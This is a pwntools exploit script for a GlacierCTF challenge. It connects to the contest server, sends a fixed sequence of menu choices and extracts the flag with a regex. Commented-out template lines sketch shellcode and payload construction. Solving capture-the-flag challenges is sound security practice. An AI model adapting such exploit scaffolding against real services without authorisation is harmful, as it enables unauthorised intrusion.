#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn.glacierctf.com --port 13373
from pwn import *
import re

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn.glacierctf.com'
port = int(args.PORT or 13373)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)


io.sendline(b'C')
io.recvuntil(b'Enter your choice:\n')

io.sendline(b'L')
io.recvuntil(b'Enter your choice:\n')
io.sendline(b'C')
io.recvuntil(b'Enter your choice:\n')
io.sendline(b'L')
io.recvuntil(b'Enter your choice:\n')
io.sendline(b'A')
io.recvuntil(b'Enter your choice:\n')
io.sendline(b'A')
io.recvuntil(b'Enter your choice:\n')
io.sendline(b'A')
io.recvuntil(b'Enter your choice:\n')
io.sendline(b'R')
io.recvuntil(b'Enter your choice:\n')
io.sendline(b'R')
io.recvuntil(b'Enter your choice:\n')
io.sendline(b'C')
io.recvuntil(b'Enter your choice:\n')
io.sendline(b'L')
io.recvuntil(b'Enter your choice:\n')
io.sendline(b'C')
io.recvuntil(b'Enter your choice:\n')
io.sendline(b'R')
io.recvuntil(b'Enter your choice:\n')
io.sendline(b'C')

flag_regex = re.compile("(glacierctf{.+[^}]})")

r = io.recvuntil(b'}').decode()
flag = flag_regex.findall(r)
flag = flag[0]
print(flag)
